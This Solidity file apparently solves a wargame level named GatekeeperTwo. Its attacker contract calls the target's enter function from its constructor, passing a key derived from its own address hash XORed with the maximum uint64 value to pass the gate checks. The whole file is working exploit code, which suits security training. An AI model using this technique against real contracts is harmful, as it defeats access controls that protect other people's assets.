// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract FuckGatekeeperTwo {
    constructor(address _address) {
        uint64 maxUint64 = 18446744073709551615;
        bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            bytes8(maxUint64);
        IGatekeeperTwo(_address).enter(key);
    }
}
